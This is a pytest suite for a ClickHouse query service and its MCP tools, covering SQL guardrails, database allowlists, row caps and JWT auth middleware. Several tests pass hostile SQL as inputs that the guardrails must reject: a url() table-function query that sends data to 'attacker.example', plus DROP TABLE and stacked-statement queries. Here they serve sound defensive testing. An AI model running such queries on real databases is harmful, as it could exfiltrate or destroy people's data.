"""Tests for app/service.py and app/mcp_server.py.

Coverage:
  1. service.py — guardrails enforced, readonly settings applied, compact shape
     returned, ALLOWED_DATABASES check raises domain errors.
  2. MCP tool callables — guardrail rejections surface as ToolError, domain
     errors translated correctly.
  3. JWTAuthMiddleware — 401 on missing/invalid token, 403 on missing tenant
     claim, 200 on a valid token; default-deny path handling.
  4. list_databases / sample_rows / explain_query / run_query end-to-end through
     service.py with mocked execute_query.

All tests mock the ClickHouse client; no live server is required.
"""

from __future__ import annotations

import os
from unittest.mock import MagicMock, patch

import pytest

from app.config import get_settings
from app.errors import (
    ClickHouseQueryError,
    ClickHouseUnavailableError,
    DatabaseNotAllowedError,
    QueryValidationError,
    TableNotFoundError,
)

# ---------------------------------------------------------------------------
# Ensure env vars are set before any app module loads
# ---------------------------------------------------------------------------
_BASE_ENV = {
    "CLICKHOUSE_HOST": "localhost",
    "CLICKHOUSE_PORT": "9000",
    "CLICKHOUSE_USER": "default",
    "CLICKHOUSE_PASSWORD": "test-password",
    "CLICKHOUSE_DATABASE": "default",
    "CLICKHOUSE_SECURE": "false",
    "API_KEY": "test-api-key-abc123",
    "MAX_EXECUTION_TIME": "30",
    "MAX_RESULT_ROWS": "10000",
    "MAX_ROWS_TO_READ": "100000000",
    "DEFAULT_LIMIT": "1000",
    "MAX_RESPONSE_ROWS": "1000",
    "ALLOWED_DATABASES": "*",
    "APP_PORT": "8000",
    "LOG_LEVEL": "INFO",
    "PUBLIC_BASE_URL": "https://test.example.com",
}

for _k, _v in _BASE_ENV.items():
    os.environ.setdefault(_k, _v)

# ---------------------------------------------------------------------------
# Module imports (after env is populated)
# ---------------------------------------------------------------------------

from app import service  # noqa: E402
from app.mcp_server import (  # noqa: E402
    JWTAuthMiddleware,
    explain_query as mcp_explain_query,
    get_table_schema as mcp_get_table_schema,
    list_databases as mcp_list_databases,
    list_tables as mcp_list_tables,
    run_query as mcp_run_query,
    sample_rows as mcp_sample_rows,
)
from tests.jwt_helpers import WRONG_PRIVATE_PEM, make_jwt  # noqa: E402


@pytest.fixture(autouse=True)
def reset_settings():
    """Clear the settings cache and restore ALLOWED_DATABASES / MAX_RESPONSE_ROWS
    to wildcard/default between tests so env-var mutations don't bleed across tests."""
    get_settings.cache_clear()
    original_allowed = os.environ.get("ALLOWED_DATABASES", "*")
    original_max_rows = os.environ.get("MAX_RESPONSE_ROWS", "1000")
    yield
    os.environ["ALLOWED_DATABASES"] = original_allowed
    os.environ["MAX_RESPONSE_ROWS"] = original_max_rows
    get_settings.cache_clear()


@pytest.fixture()
def mock_execute():
    """Patch execute_query inside app.service for all service tests."""
    with patch("app.service.execute_query") as m:
        m.return_value = (["col1"], [["val1"]])
        yield m


# ===========================================================================
# 1. service.py — list_databases
# ===========================================================================

class TestServiceListDatabases:

    def test_returns_all_when_wildcard(self, mock_execute):
        mock_execute.return_value = (["name"], [["default"], ["analytics"], ["system"]])
        os.environ["ALLOWED_DATABASES"] = "*"
        get_settings.cache_clear()

        result = service.list_databases()
        assert len(result) == 3
        assert result[0] == {"name": "default"}

    def test_filters_by_allowlist(self, mock_execute):
        mock_execute.return_value = (["name"], [["default"], ["analytics"], ["secret"]])
        os.environ["ALLOWED_DATABASES"] = "analytics"
        get_settings.cache_clear()

        result = service.list_databases()
        assert result == [{"name": "analytics"}]

    def test_calls_execute_query(self, mock_execute):
        mock_execute.return_value = (["name"], [["default"]])
        service.list_databases()
        mock_execute.assert_called_once()
        sql_arg = mock_execute.call_args[0][0]
        assert "system.databases" in sql_arg


# ===========================================================================
# 2. service.py — list_tables
# ===========================================================================

class TestServiceListTables:

    def test_returns_tables(self, mock_execute):
        mock_execute.return_value = (
            ["database", "name", "engine"],
            [["default", "events", "MergeTree"]],
        )
        result = service.list_tables("default")
        assert result == [{"database": "default", "name": "events", "engine": "MergeTree"}]

    def test_raises_domain_error_for_disallowed_database(self, mock_execute):
        os.environ["ALLOWED_DATABASES"] = "analytics"
        get_settings.cache_clear()

        with pytest.raises(DatabaseNotAllowedError) as exc_info:
            service.list_tables("secret_db")

        # execute_query must NOT be called — guardrail fires first
        mock_execute.assert_not_called()
        assert exc_info.value.code == "DATABASE_NOT_ALLOWED"

    def test_uses_parameterised_query(self, mock_execute):
        """Database name must be passed as a bind parameter, not string-interpolated."""
        mock_execute.return_value = (["database", "name", "engine"], [])
        service.list_tables("default")
        call_kwargs = mock_execute.call_args
        # parameters kwarg must include 'db'
        parameters = call_kwargs[1].get("parameters") or call_kwargs[0][2]
        assert parameters.get("db") == "default"


# ===========================================================================
# 3. service.py — get_table_schema
# ===========================================================================

class TestServiceGetTableSchema:

    def test_returns_schema(self, mock_execute):
        mock_execute.return_value = (
            ["name", "type", "comment"],
            [["id", "UInt64", ""], ["name", "String", "User name"]],
        )
        result = service.get_table_schema("default", "users")
        assert result["database"] == "default"
        assert result["table"] == "users"
        assert len(result["columns"]) == 2
        assert result["columns"][0] == {"name": "id", "type": "UInt64", "comment": ""}

    def test_raises_database_not_allowed(self, mock_execute):
        os.environ["ALLOWED_DATABASES"] = "analytics"
        get_settings.cache_clear()

        with pytest.raises(DatabaseNotAllowedError):
            service.get_table_schema("secret_db", "t")
        mock_execute.assert_not_called()

    def test_raises_table_not_found_when_no_rows(self, mock_execute):
        mock_execute.return_value = (["name", "type", "comment"], [])
        with pytest.raises(TableNotFoundError) as exc_info:
            service.get_table_schema("default", "nonexistent")
        assert exc_info.value.code == "TABLE_NOT_FOUND"


# ===========================================================================
# 4. service.py — sample_rows
# ===========================================================================

class TestServiceSampleRows:

    def test_returns_compact_shape(self, mock_execute):
        mock_execute.return_value = (["id", "name"], [["1", "Alice"]])
        result = service.sample_rows("default", "users")
        assert set(result.keys()) == {"columns", "rows", "row_count", "truncated"}
        assert result["truncated"] is False  # sample never reports truncated

    def test_caps_limit_at_50(self, mock_execute):
        mock_execute.return_value = (["id"], [["1"]])
        service.sample_rows("default", "users", limit=999)
        sql_arg = mock_execute.call_args[0][0]
        assert "LIMIT 50" in sql_arg

    def test_default_limit_is_5(self, mock_execute):
        mock_execute.return_value = (["id"], [["1"]])
        service.sample_rows("default", "users")
        sql_arg = mock_execute.call_args[0][0]
        assert "LIMIT 5" in sql_arg

    def test_raises_database_not_allowed(self, mock_execute):
        os.environ["ALLOWED_DATABASES"] = "analytics"
        get_settings.cache_clear()

        with pytest.raises(DatabaseNotAllowedError):
            service.sample_rows("secret_db", "t")
        mock_execute.assert_not_called()


# ===========================================================================
# 5. service.py — run_query
# ===========================================================================

class TestServiceRunQuery:

    def test_valid_select_passes_guardrail(self, mock_execute):
        mock_execute.return_value = (["id"], [["1"]])
        result = service.run_query("SELECT id FROM t")
        assert result["columns"] == ["id"]

    def test_guardrail_rejects_insert(self, mock_execute):
        """INSERT must be caught by validate_and_sanitize before execute_query."""
        with pytest.raises(QueryValidationError) as exc_info:
            service.run_query("INSERT INTO t VALUES (1)")
        mock_execute.assert_not_called()
        assert exc_info.value.code == "DISALLOWED_STATEMENT_TYPE"

    def test_guardrail_rejects_drop(self, mock_execute):
        with pytest.raises(QueryValidationError) as exc_info:
            service.run_query("DROP TABLE secret")
        mock_execute.assert_not_called()
        assert exc_info.value.code == "DISALLOWED_STATEMENT_TYPE"

    def test_guardrail_rejects_table_function(self, mock_execute):
        """Table-function exfiltration attempt must be blocked."""
        with pytest.raises(QueryValidationError) as exc_info:
            service.run_query(
                "SELECT * FROM url('http://attacker.example/collect', 'CSV', 'id Int32')"
            )
        mock_execute.assert_not_called()
        assert exc_info.value.code == "DISALLOWED_KEYWORD"

    def test_guardrail_rejects_multi_statement(self, mock_execute):
        with pytest.raises(QueryValidationError) as exc_info:
            service.run_query("SELECT 1; DROP TABLE x")
        mock_execute.assert_not_called()
        assert exc_info.value.code == "MULTIPLE_STATEMENTS"

    def test_limit_injected_when_absent(self, mock_execute):
        mock_execute.return_value = (["id"], [["1"]])
        service.run_query("SELECT id FROM t")
        sql_arg = mock_execute.call_args[0][0]
        assert "LIMIT" in sql_arg.upper()

    def test_caller_limit_applied(self, mock_execute):
        mock_execute.return_value = (["id"], [["1"]])
        service.run_query("SELECT id FROM t", limit=42)
        sql_arg = mock_execute.call_args[0][0]
        assert "LIMIT 42" in sql_arg

    def test_caller_limit_capped_at_max_response_rows(self, mock_execute):
        os.environ["MAX_RESPONSE_ROWS"] = "100"
        get_settings.cache_clear()
        mock_execute.return_value = (["id"], [["1"]])
        service.run_query("SELECT id FROM t", limit=9999)
        sql_arg = mock_execute.call_args[0][0]
        assert "LIMIT 100" in sql_arg

    def test_truncation_sets_flag(self, mock_execute):
        os.environ["MAX_RESPONSE_ROWS"] = "2"
        get_settings.cache_clear()
        mock_execute.return_value = (["id"], [["1"], ["2"], ["3"]])
        result = service.run_query("SELECT id FROM t LIMIT 5")
        assert result["truncated"] is True
        assert result["row_count"] == 2

    def test_clickhouse_error_raises_domain_error(self, mock_execute):
        from fastapi import HTTPException
        mock_execute.side_effect = HTTPException(
            status_code=400,
            detail={"error": "CH syntax error", "code": "CLICKHOUSE_QUERY_ERROR"},
        )
        with pytest.raises(ClickHouseQueryError):
            service.run_query("SELECT 1")

    def test_clickhouse_unavailable_raises_domain_error(self, mock_execute):
        from fastapi import HTTPException
        mock_execute.side_effect = HTTPException(
            status_code=502,
            detail={"error": "unavailable", "code": "CLICKHOUSE_UNAVAILABLE"},
        )
        with pytest.raises(ClickHouseUnavailableError):
            service.run_query("SELECT 1")


# ===========================================================================
# 6. service.py — explain_query
# ===========================================================================

class TestServiceExplainQuery:

    def test_explain_wraps_sql(self, mock_execute):
        mock_execute.return_value = (["explain"], [["ReadFromStorage"]])
        service.explain_query("SELECT 1")
        sql_arg = mock_execute.call_args[0][0]
        assert sql_arg.upper().startswith("EXPLAIN")

    def test_explain_rejects_insert(self, mock_execute):
        """Inner SQL is validated — INSERT inside EXPLAIN must be blocked."""
        with pytest.raises(QueryValidationError):
            service.explain_query("INSERT INTO t VALUES (1)")
        mock_execute.assert_not_called()

    def test_explain_truncated_always_false(self, mock_execute):
        mock_execute.return_value = (["explain"], [["step1"], ["step2"]])
        result = service.explain_query("SELECT 1")
        assert result["truncated"] is False


# ===========================================================================
# 7. MCP tool callables — guardrail rejections surface as ToolError
# ===========================================================================

class TestMcpToolGuardrails:

    def test_run_query_guardrail_raises_tool_error(self, mock_execute):
        """MCP runQuery must raise ToolError when guardrail blocks SQL."""
        from mcp.server.fastmcp.exceptions import ToolError

        with pytest.raises(ToolError) as exc_info:
            mcp_run_query(sql="INSERT INTO t VALUES (1)")
        mock_execute.assert_not_called()
        assert "DISALLOWED_STATEMENT_TYPE" in str(exc_info.value)

    def test_run_query_table_function_raises_tool_error(self, mock_execute):
        """MCP runQuery must raise ToolError for table-function exfiltration."""
        from mcp.server.fastmcp.exceptions import ToolError

        with pytest.raises(ToolError) as exc_info:
            mcp_run_query(
                sql="SELECT * FROM url('http://attacker.example/', 'CSV', 'id Int32')"
            )
        mock_execute.assert_not_called()
        assert "DISALLOWED_KEYWORD" in str(exc_info.value)

    def test_explain_query_guardrail_raises_tool_error(self, mock_execute):
        from mcp.server.fastmcp.exceptions import ToolError

        with pytest.raises(ToolError):
            mcp_explain_query(sql="DROP TABLE t")
        mock_execute.assert_not_called()

    def test_list_tables_forbidden_database_raises_tool_error(self, mock_execute):
        from mcp.server.fastmcp.exceptions import ToolError

        os.environ["ALLOWED_DATABASES"] = "analytics"
        get_settings.cache_clear()

        with pytest.raises(ToolError) as exc_info:
            mcp_list_tables(database="secret_db")
        mock_execute.assert_not_called()
        assert "DATABASE_NOT_ALLOWED" in str(exc_info.value)

    def test_get_table_schema_forbidden_database_raises_tool_error(self, mock_execute):
        from mcp.server.fastmcp.exceptions import ToolError

        os.environ["ALLOWED_DATABASES"] = "analytics"
        get_settings.cache_clear()

        with pytest.raises(ToolError):
            mcp_get_table_schema(database="secret_db", table="t")
        mock_execute.assert_not_called()

    def test_get_table_schema_not_found_raises_tool_error(self, mock_execute):
        from mcp.server.fastmcp.exceptions import ToolError

        mock_execute.return_value = (["name", "type", "comment"], [])
        with pytest.raises(ToolError) as exc_info:
            mcp_get_table_schema(database="default", table="nonexistent")
        assert "TABLE_NOT_FOUND" in str(exc_info.value)

    def test_run_query_passes_valid_sql(self, mock_execute):
        """Valid SQL must reach execute_query via the MCP tool."""
        mock_execute.return_value = (["id"], [["1"]])
        result = mcp_run_query(sql="SELECT id FROM t LIMIT 1")
        assert result["columns"] == ["id"]
        mock_execute.assert_called_once()

    def test_sample_rows_caps_at_50(self, mock_execute):
        """MCP sampleRows must cap limit at 50 regardless of input."""
        mock_execute.return_value = (["id"], [["1"]])
        mcp_sample_rows(database="default", table="t", limit=100)
        sql_arg = mock_execute.call_args[0][0]
        assert "LIMIT 50" in sql_arg

    def test_list_databases_returns_all(self, mock_execute):
        mock_execute.return_value = (["name"], [["default"], ["analytics"]])
        os.environ["ALLOWED_DATABASES"] = "*"
        get_settings.cache_clear()
        result = mcp_list_databases()
        assert len(result) == 2


# ===========================================================================
# 8. JWTAuthMiddleware — pure-ASGI auth for the MCP HTTP transport
# ===========================================================================

from starlette.applications import Starlette  # noqa: E402
from starlette.responses import PlainTextResponse  # noqa: E402
from starlette.routing import Route  # noqa: E402
from starlette.testclient import TestClient  # noqa: E402


def _inner_app(extra_routes=()):
    async def mcp_endpoint(request):
        return PlainTextResponse("mcp-ok")

    async def health_endpoint(request):
        return PlainTextResponse("health-ok")

    routes = [Route("/mcp", mcp_endpoint), Route("/health", health_endpoint)]
    routes.extend(extra_routes)
    return Starlette(routes=routes)


def _wrap(app=None, public_paths=("/health",)):
    if app is None:
        app = _inner_app()
    return JWTAuthMiddleware(app, settings=get_settings(), public_paths=public_paths)


class TestJWTAuthMiddleware:

    def test_valid_token_passes_through(self):
        client = TestClient(_wrap(), raise_server_exceptions=False)
        resp = client.get("/mcp", headers={"Authorization": f"Bearer {make_jwt()}"})
        assert resp.status_code == 200
        assert resp.text == "mcp-ok"

    def test_missing_token_returns_401(self):
        client = TestClient(_wrap(), raise_server_exceptions=False)
        resp = client.get("/mcp")
        assert resp.status_code == 401
        assert resp.json()["code"] == "MISSING_AUTH"

    def test_malformed_token_returns_401(self):
        client = TestClient(_wrap(), raise_server_exceptions=False)
        resp = client.get("/mcp", headers={"Authorization": "Bearer not-a-jwt"})
        assert resp.status_code == 401
        assert resp.json()["code"] == "INVALID_AUTH"

    def test_bad_signature_returns_401(self):
        token = make_jwt(signing_key=WRONG_PRIVATE_PEM)
        client = TestClient(_wrap(), raise_server_exceptions=False)
        resp = client.get("/mcp", headers={"Authorization": f"Bearer {token}"})
        assert resp.status_code == 401
        assert resp.json()["code"] == "INVALID_AUTH"

    def test_expired_token_returns_401(self):
        token = make_jwt(exp_delta=-3600)
        client = TestClient(_wrap(), raise_server_exceptions=False)
        resp = client.get("/mcp", headers={"Authorization": f"Bearer {token}"})
        assert resp.status_code == 401
        assert resp.json()["code"] == "TOKEN_EXPIRED"

    def test_missing_tenant_claim_returns_403(self):
        token = make_jwt(include_user_name=False)
        client = TestClient(_wrap(), raise_server_exceptions=False)
        resp = client.get("/mcp", headers={"Authorization": f"Bearer {token}"})
        assert resp.status_code == 403
        assert resp.json()["code"] == "MISSING_TENANT_CLAIM"

    def test_health_path_is_public(self):
        client = TestClient(_wrap(), raise_server_exceptions=False)
        resp = client.get("/health")
        assert resp.status_code == 200
        assert resp.text == "health-ok"

    def test_health_still_public_without_token(self):
        client = TestClient(_wrap(), raise_server_exceptions=False)
        assert client.get("/health").status_code == 200

    def test_mcp_path_requires_auth(self):
        client = TestClient(_wrap(), raise_server_exceptions=False)
        resp = client.get("/mcp")
        assert resp.status_code == 401
        assert resp.json()["code"] == "MISSING_AUTH"

    def test_default_deny_arbitrary_path(self):
        async def secret(request):
            return PlainTextResponse("secret-ok")

        app = _inner_app(extra_routes=[Route("/secret", secret)])
        client = TestClient(_wrap(app), raise_server_exceptions=False)

        assert client.get("/secret").status_code == 401
        ok = client.get("/secret", headers={"Authorization": f"Bearer {make_jwt()}"})
        assert ok.status_code == 200
        assert ok.text == "secret-ok"

    def test_unknown_path_requires_auth_not_404(self):
        client = TestClient(_wrap(), raise_server_exceptions=False)
        resp = client.get("/does-not-exist")
        assert resp.status_code == 401
        assert resp.json()["code"] == "MISSING_AUTH"

    def test_health_trailing_slash_is_public(self):
        client = TestClient(_wrap(), raise_server_exceptions=False)
        resp = client.get("/health/")
        assert resp.status_code != 401

    def test_custom_public_paths_allowlist(self):
        async def livez(request):
            return PlainTextResponse("livez-ok")

        app = _inner_app(extra_routes=[Route("/livez", livez)])
        client = TestClient(
            _wrap(app, public_paths=("/health", "/livez")), raise_server_exceptions=False
        )

        assert client.get("/livez").status_code == 200
        resp_mcp = client.get("/mcp")
        assert resp_mcp.status_code == 401
        assert resp_mcp.json()["code"] == "MISSING_AUTH"

    def test_non_http_scope_passes_through(self):
        """A non-http scope (e.g. lifespan) is forwarded, not auth-checked."""
        import anyio

        seen = {}

        async def inner(scope, receive, send):
            seen["type"] = scope["type"]

        mw = JWTAuthMiddleware(inner, settings=get_settings())

        async def driver():
            await mw({"type": "lifespan"}, None, None)

        anyio.run(driver)
        assert seen["type"] == "lifespan"


# ===========================================================================
# 9. HTTP startup guard — must fail closed when OIDC auth is not configured
# ===========================================================================

class TestHttpStartupGuard:

    def test_run_http_exits_when_auth_not_configured(self):
        import asyncio
        from unittest.mock import MagicMock, patch

        fake_settings = MagicMock()
        fake_settings.auth_configured.return_value = False

        from app import mcp_server

        with patch.object(mcp_server, "settings", fake_settings):
            with pytest.raises(SystemExit) as exc_info:
                asyncio.run(mcp_server._run_http())
        assert exc_info.value.code == 1


# ===========================================================================
# 10. Auth-config contract — stdio needs no OIDC; REST/MCP HTTP fail closed
# ===========================================================================

class TestAuthConfigContract:

    def test_settings_constructs_without_oidc(self):
        """Settings() builds without OIDC config so MCP stdio can start."""
        from unittest.mock import patch

        from app.config import Settings

        with patch.dict(os.environ):
            for k in ("OIDC_JWKS_URL", "OIDC_ISSUER", "OIDC_AUDIENCE"):
                os.environ.pop(k, None)
            s = Settings()
            assert s.auth_configured() is False
        get_settings.cache_clear()

    def test_rest_auth_fails_closed_without_oidc(self):
        """REST returns 503 AUTH_NOT_CONFIGURED for any request when OIDC is unset."""
        from unittest.mock import MagicMock, patch

        with patch.dict(os.environ):
            for k in ("OIDC_JWKS_URL", "OIDC_ISSUER", "OIDC_AUDIENCE"):
                os.environ.pop(k, None)
            get_settings.cache_clear()

            mock_ch = MagicMock()
            mock_ch.ping.return_value = True
            with patch("app.clickhouse_client.get_client", return_value=mock_ch):
                with patch("app.service.execute_query", return_value=(["c"], [["v"]])):
                    from fastapi.testclient import TestClient as FastTestClient

                    from app.main import app

                    client = FastTestClient(app, raise_server_exceptions=False)
                    resp = client.post(
                        "/query",
                        headers={"Authorization": f"Bearer {make_jwt()}"},
                        json={"sql": "SELECT 1"},
                    )
                    assert resp.status_code == 503
                    assert resp.json()["detail"]["code"] == "AUTH_NOT_CONFIGURED"
        get_settings.cache_clear()

    def test_mcp_stdio_import_succeeds_without_oidc(self):
        import sys

        with patch.dict(os.environ):
            for k in ("OIDC_JWKS_URL", "OIDC_ISSUER", "OIDC_AUDIENCE"):
                os.environ.pop(k, None)
            sys.modules.pop("app.mcp_server", None)
            get_settings.cache_clear()
            try:
                import app.mcp_server  # noqa: F401
            finally:
                get_settings.cache_clear()
                import app.mcp_server  # noqa: F401,F811


# ===========================================================================
# 11. MCP ASGI transport smoke test — exercises the real streamable-HTTP app
# ===========================================================================

class TestMcpHttpTransportSmoke:

    def _build_authed_app(self):
        from app.mcp_server import mcp

        return JWTAuthMiddleware(mcp.streamable_http_app(), settings=get_settings())

    def test_asgi_app_builds_without_error(self):
        assert self._build_authed_app() is not None

    def test_missing_auth_returns_401_not_500(self):
        from starlette.testclient import TestClient as StarletteTestClient

        client = StarletteTestClient(self._build_authed_app(), raise_server_exceptions=False)
        resp = client.get("/mcp")
        assert resp.status_code == 401
        assert resp.json()["code"] == "MISSING_AUTH"

    def test_valid_token_passes_auth_layer(self):
        from starlette.testclient import TestClient as StarletteTestClient

        client = StarletteTestClient(self._build_authed_app(), raise_server_exceptions=False)
        resp = client.get("/mcp", headers={"Authorization": f"Bearer {make_jwt()}"})
        assert resp.status_code != 401
